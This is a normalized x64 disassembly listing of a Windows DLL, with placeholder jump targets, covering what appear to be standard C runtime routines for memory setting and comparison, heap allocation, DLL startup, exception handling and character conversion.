push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_180025c90
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_180025c90
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_180025c90
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180020e7c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180025c90
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_180020eb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_180025c90
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_180025c90
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_1800260d0
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_1800260d0
call sub_180025c90
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180020f10
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x4b8 ]
sub rsp 0x5b8
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4a0 ] rax
mov rbx [ rbp + 0x520 ]
mov rdi [ rbp + 0x530 ]
mov r14 [ rbp + 0x538 ]
mov r13 rdx
mov r15 rcx
mov r12 r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rsi r9
call sub_1800205e0
movsxd rax [ rbp + 0x528 ]
mov rdx [ r14 ]
mov rcx [ r15 ]
mov [ rsp + 0x68 ] rax
movzx eax [ rbp + 0x540 ]
lea r11 [ sub_1800242cc ]
lea r8 [ rsp + 0x30 ]
mov [ rbp - 0x78 ] rax
mov rax [ r14 + 0x40 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x30 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x78 ] rdi
mov [ rbp - 0x80 ] r13
mov [ rbp - 0x70 ] 0x19930520
call RtlUnwindEx
mov rcx [ rbp + 0x4a0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x5b8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_180021000
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_1800213d4
test rax rax
je r-xdata
mov rcx rbx
call sub_180026120
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_180020510
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_1800210a4
int3
or eax r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
call sub_180020370
lea rcx [ sub_1800376c0 ]
mov [ rw-data ] rbx
call sub_180021c0c
sub_1800210a4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rbp - 0x40 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_1800205e0
lea rdx [ rbp + 0x10 ]
mov rcx rdi
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x10 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rbp + 0x10 ] rax
mov [ rbp - 0x8 ] rax
test rdi rdi
je r-xdata
mov r8d [ rbp - 0x28 ]
mov edx [ rbp - 0x3c ]
mov ecx [ rbp - 0x40 ]
lea r9 [ rbp - 0x20 ]
call [ RaiseException@IAT ]
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rbp - 0x20 ]
test r11 r11
cmove eax ecx
mov [ rbp - 0x20 ] eax
mov [ rbp - 0x20 ] ecx
jmp r-xdata
sub_180021150
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_18002123c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_18002148c
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_180020b8c
mov r8d eax
sub_180021308
push rbx
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
lea r8 [ rsp + 0x40 ]
call sub_1800262a0
mov rbx rax
test rax rax
jne r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
cmp [ rsp + 0x40 ] eax
je r-xdata
call sub_180022de4
test rax rax
je r-xdata
call sub_180022de4
mov ecx [ rsp + 0x40 ]
mov [ rax ] ecx
sub_18002134c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi r8
mov rdi rdx
test r9 r9
jne r-xdata
test rcx rcx
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
je r-xdata
call sub_180022de4
mov ebx 0x16
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov r8 rdx
xor edx edx
call sub_180021150
test rsi rsi
je r-xdata
cmp rdx rbx
jb r-xdata
cmp rdi rbx
jae r-xdata
mov r8 rbx
mov rdx rsi
call sub_1800205e0
jmp r-xdata
mov eax 0x16
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_180026534
mov eax ebx
jmp r-xdata
sub_1800213d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_180026120
call sub_180022de4
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_18002574c
mov ecx 0x1e
call sub_1800254ec
mov ecx 0xff
call sub_180026590
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_180022de4
mov [ rax ] 0xc
mov rcx rbx
call sub_180026120
test eax eax
je r-xdata
call sub_180022de4
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_18002148c
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_1800212e0
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_180021520
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_18002163c
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r9d r9d
mov r11 rdx
mov [ rsp ] r9
mov [ rsp + 0x8 ] r9
mov [ rsp + 0x10 ] r9
mov [ rsp + 0x18 ] r9
mov r10 rcx
jmp r-xdata
mov edx 0x1
test al al
jne r-xdata
movzx r8d al
movzx eax al
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r11
mov al [ r11 ]
or [ rsp ] dl
jmp r-xdata
movzx r8d [ r10 ]
mov ecx r8d
shr r8 0x3
and ecx 0x7
shl edx cl
test [ rsp + r8 ] dl
je r-xdata
inc r9d
mov edx 0x1
inc r10
movsxd rax r9d
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x38
retn
sub_1800216d0
push rbx
sub rsp 0x20
mov rax r8
test r9 r9
je r-xdata
xor eax eax
test rcx rcx
jne r-xdata
test rax rax
je r-xdata
call sub_180022de4
mov ebx 0x16
cmp rdx r9
jae r-xdata
add rsp 0x20
pop rbx
retn
mov r8 r9
mov rdx rax
call sub_1800205e0
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_180026534
mov eax ebx
jmp r-xdata
sub_180021724
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbp
push rbx
push rdi
mov rbp rsp
sub rsp 0x50
and [ rbp - 0x30 ] 0x0
mov rdi rdx
xor edx edx
mov rbx rcx
lea rcx [ rbp - 0x28 ]
lea r8d [ rdx + 0x28 ]
call sub_180021150
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
or eax 0xffffffff
jmp r-xdata
lea r9 [ rbp + 0x30 ]
lea rcx [ rbp - 0x30 ]
xor r8d r8d
mov rdx rdi
mov [ rbp - 0x28 ] 0x7fffffff
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rbx
mov [ rbp - 0x30 ] rbx
call sub_180026e04
dec [ rbp - 0x28 ]
mov ebx eax
js r-xdata
add rsp 0x50
pop rdi
pop rbx
pop rbp
retn
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_180026c74
mov rcx [ rbp - 0x30 ]
mov [ rcx ] 0x0
jmp r-xdata
mov eax ebx
sub_1800217e8
lea rax [ j_sub_180027a40 ]
lea rcx [ sub_18002869c ]
mov [ rw-data ] rax
lea rax [ sub_180027b3c ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_180027b44 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_180027ae0 ]
mov [ rw-data ] rax
lea rax [ sub_180028604 ]
mov [ rw-data ] rax
lea rax [ sub_180027af8 ]
mov [ rw-data ] rax
lea rax [ sub_180027a40 ]
mov [ rw-data ] rax
lea rax [ sub_1800279c0 ]
mov [ rw-data ] rax
retn
sub_180021890
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180021974
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
test rbp rbp
jne r-xdata
and [ rbp ] 0x0
test rax rax
jne r-xdata
call sub_180022de4
mov ebx 0x16
mov [ rax ] ebx
call sub_180026534
mov eax ebx
jmp r-xdata
mov edx 0x4
mov rcx rbp
call rdi
test eax eax
jne r-xdata
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
xor eax eax
call sub_180022de4
mov [ rax ] 0xc
call sub_180022de4
mov eax [ rax ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
jne r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
mov rbx rax
call EncodePointer
xchg [ rw-data ] rbx
cmp rbx rax
je r-xdata
call sub_180022de4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180022d9c
mov [ rbx ] eax
call sub_180026534
call [ GetLastError@IAT ]
mov ecx eax
call sub_180022d9c
jmp r-xdata
mov rcx rsi
call [ FreeLibrary@IAT ]
sub_180021abc
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_180022c90
mov rcx rax
mov rbx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180021b00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_1800265a8
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov r12 rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_1800288dc
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call [ EncodePointer@IAT ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_1800265b4
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_180022d14
xor ebx ebx
test rax rax
jne r-xdata
mov rcx r12
call sub_180022d14
test rax rax
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_180021c24
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x50
xor ebx ebx
mov r12 r8
mov r13 rcx
mov rsi rdx
lea rcx [ rbp - 0x28 ]
lea r8d [ rbx + 0x28 ]
xor edx edx
mov rdi r9
mov [ rbp - 0x30 ] rbx
call sub_180021150
test rdi rdi
jne r-xdata
test r12 r12
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
or eax 0xffffffff
jmp r-xdata
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] rsi
cmp r12 0x3fffffff
jbe r-xdata
test rsi rsi
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
lea eax [ r12 + r12 ]
mov [ rbp - 0x28 ] eax
mov [ rbp - 0x28 ] 0x7fffffff
jmp r-xdata
test eax eax
js r-xdata
mov r9 [ rbp + 0x48 ]
mov r8 [ rbp + 0x40 ]
lea rcx [ rbp - 0x30 ]
mov rdx rdi
call r13
mov edi eax
test rsi rsi
je r-xdata
cmp [ rbp - 0x28 ] ebx
mov [ rsi + r12 * 2 - 0x2 ] bx
setge bl
lea eax [ rbx - 0x2 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_180026c74
cmp eax 0xffffffff
je r-xdata
mov rax [ rbp - 0x30 ]
mov [ rax ] bl
mov rax [ rbp - 0x30 ]
inc rax
mov [ rbp - 0x30 ] rax
jmp r-xdata
mov rax [ rbp - 0x30 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_180026c74
cmp eax 0xffffffff
je r-xdata
mov [ rax ] bl
jmp r-xdata
mov eax edi
jmp r-xdata
sub_180021d40
sub rsp 0x38
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_180028918 ]
call sub_180021c24
or ecx 0xffffffff
test eax eax
cmovs eax ecx
add rsp 0x38
retn
sub_180021d78
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
xor edi edi
mov rbx rcx
test r8 r8
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
test rcx rcx
je r-xdata
test rdx rdx
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_180029530 ]
call sub_180021c24
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ rbx ] di
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
call sub_180022de4
mov [ rax ] 0x22
jmp r-xdata
call sub_180026534
or eax 0xffffffff
sub_180021e18
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180022de4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10w
je r-xdata
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
add rcx 0x2
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10w
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_180022de4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_180026534
mov eax ebx
sub_180021ea0
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_180022de4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
sub rcx r8
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_180022de4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_180026534
mov eax ebx
sub_180021f0c
mov [ rsp + 0x18 ] r8
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
call sub_180025974
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_180025e28
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_180025b28
mov edx 0x2c8
mov ecx 0x1
call sub_180022c90
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_18002a8a4
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_18002a7b0
mov [ rw-data ] rax
call sub_18002a070
test eax eax
jns r-xdata
call sub_1800259cc
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_180025de8
mov rdx rax
mov ecx [ rw-data ]
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_1800268c0
call sub_18002a6b8
test eax eax
js r-xdata
call sub_180025b2c
jmp r-xdata
call sub_18002094c
jmp r-xdata
xor edx edx
call sub_180025b54
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
or [ rbx + 0x8 ] 0xffffffffffffffff
jmp r-xdata
test rbx rbx
jne r-xdata
call sub_18002a344
call sub_180025b2c
call sub_1800259cc
nop
call sub_18002a344
jmp r-xdata
call sub_18002a3b8
test eax eax
js r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
xor ecx ecx
call sub_180026674
test eax eax
jne r-xdata
call sub_180025b2c
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
sub_180022060
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_18001f290
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
xor eax eax
jmp r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180021f0c
mov [ rsp + 0x20 ] eax
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180021f0c
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_18001f290
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180021f0c
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180022060
call sub_18002a914
sub_1800221bc
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movups xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_180025c90
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
cmp rdx [ rw-data ]
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_180026bfc
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_18002ac44
mov [ rbx + 0x8 ] rax
sub_180022260
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov ebx [ rbp + 0x60 ]
xor edi edi
mov r14 r9
mov r15d r8d
mov [ rbp ] edx
test ebx ebx
jle r-xdata
mov r12d [ rbp + 0x78 ]
mov esi edi
test r12d r12d
jne r-xdata
mov r10d ebx
mov rax r9
neg [ rbp + 0x80 ]
mov r9d ebx
mov r8 r14
sbb edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
and edx 0x8
mov [ rsp + 0x20 ] rdi
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov r12d [ rax + 0x4 ]
mov eax ebx
sub eax r10d
dec eax
cmp eax ebx
lea ebx [ rax + 0x1 ]
jl r-xdata
inc rax
test r10d r10d
jne r-xdata
mov r8 0xffffffffffffff0
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
dec r10d
cmp [ rax ] dil
je r-xdata
or r10d 0xffffffff
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_1800212e0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d ebx
mov r8 r14
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
